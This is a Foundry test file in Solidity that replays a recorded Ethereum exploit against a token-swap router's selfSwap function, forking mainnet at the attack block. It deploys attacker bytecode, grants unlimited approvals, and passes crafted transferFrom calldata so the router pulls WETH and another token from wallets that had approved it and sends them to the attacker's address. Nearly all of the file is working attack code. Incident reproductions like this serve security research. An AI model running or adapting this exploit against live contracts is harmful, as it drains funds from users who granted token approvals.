// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6
// https://etherscan.io/address/0x684083F312Ac50f538Cc4B634d85a2feafaAB77a

struct S4 {
    S5 p1;
    S2 p2;
    S2 p3;
    S3[] p4;
}

struct S5 {
    address p1;
    S6 p2;
}

struct S1 {
    address p1;
    S2 p2;
    S2 p3;
    S3[] p4;
}

struct S3 {
    address p1;
    address p2;
    S2 p3;
    bytes p4;
}

struct S6 {
    address p1;
    address p2;
    uint256 p3;
}

struct S8 {
    bool p1;
    address p2;
    uint256 p3;
    uint256 p4;
    uint16 p5;
    uint16 p6;
}

struct S7 {
    bool p1;
    bool p2;
    address p3;
    uint256 p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    uint256 p8;
    uint256 p9;
    uint256 p10;
    uint256 p11;
    uint256 p12;
    uint256 p13;
}

struct S2 {
    uint112 p1;
    address p2;
}

interface I {
    function withdraw(uint256) external payable;
    function transfer(address, uint256) external payable;
    function swapExactETHForTokens(uint256, address[] memory, address, uint256) external payable;
    function allowance(address, address) external payable returns (uint256);
    function balanceOf(address) external payable returns (uint256);
    function selfSwap(S1 memory) external payable;
    function approve(address, uint256) external payable;
}

contract X194f is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6");
    }

    address constant x4c19 = 0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784;
    address constant x58f5 = 0x58f5F0684C381fCFC203D77B2BbA468eBb29B098;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc440 = 0xC440604DAC90d672838D69b99D17bdb14E55d5B8;
    address constant xd9e1 = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address constant xde62 = 0xDE62E1b0edAa55aAc5ffBE21984D321706418024;

    uint256 t_xbf4c1d60 = 0;

    function test1() public {
        // vm.startPrank(0x684083F312Ac50f538Cc4B634d85a2feafaAB77a, 0x684083F312Ac50f538Cc4B634d85a2feafaAB77a);

        vm.createSelectFork("http://localhost:18545", 16646022); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xf89c5d0d1c4578401db2a2d258cdb7efa7b52206937678f9a5ca808bcace3d17));

        // https://explorer.phalcon.xyz/tx/eth/0xf89c5d0d1c4578401db2a2d258cdb7efa7b52206937678f9a5ca808bcace3d17
        this.xf89c5d0d();
        // https://explorer.phalcon.xyz/tx/eth/0xeb3a560927b118149f68acb9b11eeb93fcc91d7f98a315117974eecdcd42e206
        this.xeb3a5609();
        // https://explorer.phalcon.xyz/tx/eth/0x1139f3c3e374e785c7be5413226d0be32bc21d477ee8d0ff0b38f4ab93ff1df2
        this.x1139f3c3();
        // https://explorer.phalcon.xyz/tx/eth/0xb3cfbd40752c149761d105890f40d860a4366a819add6f5414db9bc474cc6481
        this.xb3cfbd40();
        // https://explorer.phalcon.xyz/tx/eth/0x5ce8d4e1bc9fff438053cf01fddad7889c528d2f2ea9315a417cb49acdd4e446
        this.x5ce8d4e1();
        // https://explorer.phalcon.xyz/tx/eth/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6
        xbf4c1d60();
    }

    function test2() public {
        // vm.startPrank(0x684083F312Ac50f538Cc4B634d85a2feafaAB77a, 0x684083F312Ac50f538Cc4B634d85a2feafaAB77a);

        vm.createSelectFork("http://localhost:18545", 16645863); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xf89c5d0d1c4578401db2a2d258cdb7efa7b52206937678f9a5ca808bcace3d17
        this.xf89c5d0d();
        vm.warp(1676606627);
        vm.roll(16645939);
        // https://explorer.phalcon.xyz/tx/eth/0xeb3a560927b118149f68acb9b11eeb93fcc91d7f98a315117974eecdcd42e206
        this.xeb3a5609();
        vm.warp(1676606759);
        vm.roll(16645950);
        // https://explorer.phalcon.xyz/tx/eth/0x1139f3c3e374e785c7be5413226d0be32bc21d477ee8d0ff0b38f4ab93ff1df2
        this.x1139f3c3();
        vm.warp(1676607395);
        vm.roll(16646002);
        // https://explorer.phalcon.xyz/tx/eth/0xb3cfbd40752c149761d105890f40d860a4366a819add6f5414db9bc474cc6481
        this.xb3cfbd40();
        vm.warp(1676607455);
        vm.roll(16646007);
        // https://explorer.phalcon.xyz/tx/eth/0x5ce8d4e1bc9fff438053cf01fddad7889c528d2f2ea9315a417cb49acdd4e446
        this.x5ce8d4e1();
        vm.warp(1676607635);
        vm.roll(16646022);
        // https://explorer.phalcon.xyz/tx/eth/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6
        xbf4c1d60();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 16646022); // tx.blockNumber - 1

        vm.warp(1676607635);
        vm.roll(16646023);
        // https://explorer.phalcon.xyz/tx/eth/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6
        xbf4c1d60();
    }

    function xb3cfbd40() public {
        r.call(abi.encodeWithSelector(0xbf4c1d60, xde62, xa0b8, xc02a, xc440));
    }

    function x1139f3c3() public {
        I(xa0b8).transfer(r, 1000000);
    }

    function xeb3a5609() public {
        _constructor_();
    }

    function xf89c5d0d() public {
        address[] memory arr01 = new address[](2);
        arr01[0] = xc02a;
        arr01[1] = xa0b8;
        I(xd9e1).swapExactETHForTokens{value: 1000000000000000}(1649967, arr01, tx.origin, block.timestamp + 1);
    }

    function xbf4c1d60() public {
        t_xbf4c1d60++;

        if (t_xbf4c1d60 == 1) {
            I(xa0b8).approve(xde62, 115792089237316195423570985008687907853269984665640564039457584007913129639934);
            I(xc02a).balanceOf(xc440);
            I(xc02a).allowance(xc440, xde62);

            S2 memory s201 = S2(14403789, xa0b8);
            S2 memory s202 = S2(0, xa0b8);
            S2 memory s203 = S2(0, xc02a);
            bytes memory b01 =
                hex"23b872dd000000000000000000000000c440604dac90d672838d69b99d17bdb14e55d5b8000000000000000000000000684083f312ac50f538cc4b634d85a2feafaab77a0000000000000000000000000000000000000000000000009d764eb388499c3a";
            S3 memory s301 = S3(xc02a, xde62, s203, b01);
            S3[] memory arr02 = new S3[](1);
            arr02[0] = s301;
            S1 memory s101 = S1(xa0b8, s201, s202, arr02);
            I(xde62).selfSwap(s101);

            return;
        }
        if (t_xbf4c1d60 == 2) {
            I(xa0b8).approve(xde62, 115792089237316195423570985008687907853269984665640564039457584007913129639934);
            I(x4c19).balanceOf(x58f5);
            I(x4c19).allowance(x58f5, xde62);

            S2 memory s213 = S2(14403789, xa0b8);
            S2 memory s214 = S2(0, xa0b8);
            S2 memory s215 = S2(0, x4c19);
            bytes memory b05 =
                hex"23b872dd00000000000000000000000058f5f0684c381fcfc203d77b2bba468ebb29b098000000000000000000000000684083f312ac50f538cc4b634d85a2feafaab77a00000000000000000000000000000000000000000000000000066189a9f3b980";
            S3 memory s305 = S3(x4c19, xde62, s215, b05);
            S3[] memory arr06 = new S3[](1);
            arr06[0] = s305;
            S1 memory s103 = S1(xa0b8, s213, s214, arr06);
            I(xde62).selfSwap(s103);

            return;
        }
    }

    function x5ce8d4e1() public {
        I(xc02a).withdraw(1000000000000000000);
    }

    function _constructor_() public {
        bytes memory rt = abi.encodePacked(
            hex"608060405234801561001057600080fd5b506004361061002b5760003560e01c",
            hex"8063bf4c1d6014610030575b600080fd5b61004a600480360381019061004591",
            hex"90610c38565b61004c565b005b60008054906101000a900473ffffffffffffff",
            hex"ffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffff",
            hex"ffffff163373ffffffffffffffffffffffffffffffffffffffff16146100a457",
            hex"600080fd5b8273ffffffffffffffffffffffffffffffffffffffff1663095ea7",
            hex"b38560017fffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffff6100ee9190610cd8565b6040518363ffffffff1660e01b81526004",
            hex"0161010b929190610d2a565b600060405180830381600087803b158015610125",
            hex"57600080fd5b505af1158015610139573d6000803e3d6000fd5b505050506000",
            hex"8273ffffffffffffffffffffffffffffffffffffffff166370a0823183604051",
            hex"8263ffffffff1660e01b81526004016101789190610d53565b60206040518083",
            hex"03816000875af1158015610197573d6000803e3d6000fd5b505050506040513d",
            hex"601f19601f820116820180604052508101906101bb9190610d9a565b90506000",
            hex"8373ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e84886040",
            hex"518363ffffffff1660e01b81526004016101fa929190610dc7565b6020604051",
            hex"808303816000875af1158015610219573d6000803e3d6000fd5b505050506040",
            hex"513d601f19601f8201168201806040525081019061023d9190610d9a565b9050",
            hex"8181111561069a5761024f610af1565b85816000019073ffffffffffffffffff",
            hex"ffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffff",
            hex"ffffff16815250508581602001516020019073ffffffffffffffffffffffffff",
            hex"ffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16",
            hex"8152505062dbc8cd8160200151600001906dffffffffffffffffffffffffffff",
            hex"1690816dffffffffffffffffffffffffffff1681525050858160400151602001",
            hex"9073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffff",
            hex"ffffffffffffffffffffffffffff168152505060008160400151600001906dff",
            hex"ffffffffffffffffffffffffff1690816dffffffffffffffffffffffffffff16",
            hex"815250506000600167ffffffffffffffff8111156103805761037f610df0565b",
            hex"5b6040519080825280602002602001820160405280156103b957816020015b61",
            hex"03a6610b3b565b81526020019060019003908161039e5790505b509050858160",
            hex"00815181106103d1576103d0610e1f565b5b60200260200101516000019073ff",
            hex"ffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffff",
            hex"ffffffffffffffffffffff168152505087816000815181106104245761042361",
            hex"0e1f565b5b60200260200101516020019073ffffffffffffffffffffffffffff",
            hex"ffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681",
            hex"52505060008160008151811061047857610477610e1f565b5b60200260200101",
            hex"5160400151600001906dffffffffffffffffffffffffffff1690816dffffffff",
            hex"ffffffffffffffffffff168152505085816000815181106104c3576104c2610e",
            hex"1f565b5b6020026020010151604001516020019073ffffffffffffffffffffff",
            hex"ffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffff",
            hex"ff168152505060006040518060400160405280600481526020017f23b872dd00",
            hex"0000000000000000000000000000000000000000000000000000008152509050",
            hex"6000866040516020016105529190610d53565b60405160208183030381529060",
            hex"4052905060008060009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff166040516020016105979190610d53565b6040516020818303",
            hex"0381529060405290506000876040516020016105bb9190610e4e565b60405160",
            hex"208183030381529060405290506000848484846040516020016105e594939291",
            hex"90610ee3565b6040516020818303038152906040529050808660008151811061",
            hex"060b5761060a610e1f565b5b6020026020010151606001819052508587606001",
            hex"819052508c73ffffffffffffffffffffffffffffffffffffffff1663c3d718a4",
            hex"886040518263ffffffff1660e01b815260040161065c919061116b565b600060",
            hex"405180830381600087803b15801561067657600080fd5b505af115801561068a",
            hex"573d6000803e3d6000fd5b5050505050505050505050610ae9565b6106a2610a",
            hex"f1565b85816000019073ffffffffffffffffffffffffffffffffffffffff1690",
            hex"8173ffffffffffffffffffffffffffffffffffffffff16815250508581602001",
            hex"516020019073ffffffffffffffffffffffffffffffffffffffff16908173ffff",
            hex"ffffffffffffffffffffffffffffffffffff168152505062dbc8cd8160200151",
            hex"600001906dffffffffffffffffffffffffffff1690816dffffffffffffffffff",
            hex"ffffffffff16815250508581604001516020019073ffffffffffffffffffffff",
            hex"ffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffff",
            hex"ff168152505060008160400151600001906dffffffffffffffffffffffffffff",
            hex"1690816dffffffffffffffffffffffffffff16815250506000600167ffffffff",
            hex"ffffffff8111156107d3576107d2610df0565b5b604051908082528060200260",
            hex"20018201604052801561080c57816020015b6107f9610b3b565b815260200190",
            hex"6001900390816107f15790505b50905085816000815181106108245761082361",
            hex"0e1f565b5b60200260200101516000019073ffffffffffffffffffffffffffff",
            hex"ffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681",
            hex"525050878160008151811061087757610876610e1f565b5b6020026020010151",
            hex"6020019073ffffffffffffffffffffffffffffffffffffffff16908173ffffff",
            hex"ffffffffffffffffffffffffffffffffff168152505060008160008151811061",
            hex"08cb576108ca610e1f565b5b602002602001015160400151600001906dffffff",
            hex"ffffffffffffffffffffff1690816dffffffffffffffffffffffffffff168152",
            hex"5050858160008151811061091657610915610e1f565b5b602002602001015160",
            hex"4001516020019073ffffffffffffffffffffffffffffffffffffffff16908173",
            hex"ffffffffffffffffffffffffffffffffffffffff168152505060006040518060",
            hex"400160405280600481526020017f23b872dd0000000000000000000000000000",
            abi.encode(address(0x000081525090506000866040516020016109A591)),
            hex"90610d53565b6040516020818303038152906040529050600080600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff166040516020",
            hex"016109ea9190610d53565b604051602081830303815290604052905060008660",
            hex"4051602001610a0e9190610e4e565b6040516020818303038152906040529050",
            hex"600084848484604051602001610a389493929190610ee3565b60405160208183",
            hex"030381529060405290508086600081518110610a5e57610a5d610e1f565b5b60",
            hex"20026020010151606001819052508587606001819052508c73ffffffffffffff",
            hex"ffffffffffffffffffffffffff1663c3d718a4886040518263ffffffff1660e0",
            hex"1b8152600401610aaf919061116b565b600060405180830381600087803b1580",
            hex"15610ac957600080fd5b505af1158015610add573d6000803e3d6000fd5b5050",
            hex"5050505050505050505b505050505050565b6040518060800160405280600073",
            hex"ffffffffffffffffffffffffffffffffffffffff168152602001610b21610b95",
            hex"565b8152602001610b2e610b95565b8152602001606081525090565b60405180",
            hex"60800160405280600073ffffffffffffffffffffffffffffffffffffffff1681",
            hex"52602001600073ffffffffffffffffffffffffffffffffffffffff1681526020",
            hex"01610b88610b95565b8152602001606081525090565b60405180604001604052",
            hex"8060006dffffffffffffffffffffffffffff168152602001600073ffffffffff",
            hex"ffffffffffffffffffffffffffffff1681525090565b600080fd5b600073ffff",
            hex"ffffffffffffffffffffffffffffffffffff82169050919050565b6000610c05",
            hex"82610bda565b9050919050565b610c1581610bfa565b8114610c2057600080fd",
            hex"5b50565b600081359050610c3281610c0c565b92915050565b60008060008060",
            hex"808587031215610c5257610c51610bd5565b5b6000610c6087828801610c2356",
            hex"5b9450506020610c7187828801610c23565b9350506040610c8287828801610c",
            hex"23565b9250506060610c9387828801610c23565b91505092959194509250565b",
            hex"6000819050919050565b7f4e487b710000000000000000000000000000000000",
            hex"0000000000000000000000600052601160045260246000fd5b6000610ce38261",
            hex"0c9f565b9150610cee83610c9f565b925082821015610d0157610d00610ca956",
            hex"5b5b828203905092915050565b610d1581610bfa565b82525050565b610d2481",
            hex"610c9f565b82525050565b6000604082019050610d3f6000830185610d0c565b",
            hex"610d4c6020830184610d1b565b9392505050565b6000602082019050610d6860",
            hex"00830184610d0c565b92915050565b610d7781610c9f565b8114610d82576000",
            hex"80fd5b50565b600081519050610d9481610d6e565b92915050565b6000602082",
            hex"84031215610db057610daf610bd5565b5b6000610dbe84828501610d85565b91",
            hex"505092915050565b6000604082019050610ddc6000830185610d0c565b610de9",
            hex"6020830184610d0c565b9392505050565b7f4e487b7100000000000000000000",
            hex"000000000000000000000000000000000000600052604160045260246000fd5b",
            hex"7f4e487b71000000000000000000000000000000000000000000000000000000",
            hex"00600052603260045260246000fd5b6000602082019050610e63600083018461",
            hex"0d1b565b92915050565b600081519050919050565b600081905092915050565b",
            hex"60005b83811015610e9d578082015181840152602081019050610e82565b8381",
            hex"1115610eac576000848401525b50505050565b6000610ebd82610e69565b610e",
            hex"c78185610e74565b9350610ed7818560208601610e7f565b8084019150509291",
            hex"5050565b6000610eef8287610eb2565b9150610efb8286610eb2565b9150610f",
            hex"078285610eb2565b9150610f138284610eb2565b915081905095945050505050",
            hex"565b610f2a81610bfa565b82525050565b60006dffffffffffffffffffffffff",
            hex"ffff82169050919050565b610f5381610f30565b82525050565b604082016000",
            hex"820151610f6f6000850182610f4a565b506020820151610f826020850182610f",
            hex"21565b50505050565b600081519050919050565b600082825260208201905092",
            hex"915050565b6000819050602082019050919050565b6000828252602082019050",
            hex"92915050565b6000601f19601f8301169050919050565b6000610fe182610e69",
            hex"565b610feb8185610fb4565b9350610ffb818560208601610e7f565b61100481",
            hex"610fc5565b840191505092915050565b600060a0830160008301516110276000",
            hex"860182610f21565b50602083015161103a6020860182610f21565b5060408301",
            hex"5161104d6040860182610f59565b506060830151848203608086015261106582",
            hex"82610fd6565b9150508091505092915050565b600061107e838361100f565b90",
            hex"5092915050565b6000602082019050919050565b600061109e82610f88565b61",
            hex"10a88185610f93565b9350836020820285016110ba85610fa4565b8060005b85",
            hex"8110156110f657848403895281516110d78582611072565b94506110e2836110",
            hex"86565b925060208a019950506001810190506110be565b508297508795505050",
            hex"50505092915050565b600060c0830160008301516111206000860182610f2156",
            hex"5b5060208301516111336020860182610f59565b506040830151611146606086",
            hex"0182610f59565b50606083015184820360a086015261115e8282611093565b91",
            hex"50508091505092915050565b6000602082019050818103600083015261118581",
            hex"84611108565b90509291505056fea264697066735822122054e68b21ed68c9dc",
            hex"bb9c306eca0fc1eee9892cfa25a95e4ad34a60905093a91664736f6c63430008",
            hex"0d0033"
        );
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0xbf4c1d60) {
            xbf4c1d60();
            return;
        }
        revert("no such function");
    }
}
